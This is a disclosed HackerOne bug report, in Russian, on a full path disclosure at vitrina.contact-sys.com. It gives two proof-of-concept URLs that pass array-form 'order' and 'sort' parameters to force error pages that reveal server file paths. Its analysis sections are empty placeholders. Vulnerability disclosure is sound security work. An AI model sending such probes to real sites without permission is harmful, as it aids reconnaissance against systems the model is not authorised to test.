---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '178284'
original_report_id: '178284'
title: '[vitrina.contact-sys.com] Full Path Disclosure'
weakness: Information Disclosure
team_handle: qiwi
created_at: '2016-10-26T20:00:35.250Z'
disclosed_at: '2018-11-18T07:12:22.125Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 12
tags:
- hackerone
- information-disclosure
---

# [vitrina.contact-sys.com] Full Path Disclosure

## Metadata

- HackerOne Report ID: 178284
- Weakness: Information Disclosure
- Program: qiwi
- Disclosed At: 2018-11-18T07:12:22.125Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

**Уязвимый сценарий**: /user/all/orders
**Уязвимые параметры**: order, sort
**PoC**:
```
http://vitrina.contact-sys.com/user/all/orders?order[]=order_number&sort=desc
http://vitrina.contact-sys.com/user/all/orders?order=order_number&sort[]=desc
```

**Примеры путей**:
```
█████_plugin_style_table.inc
```

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
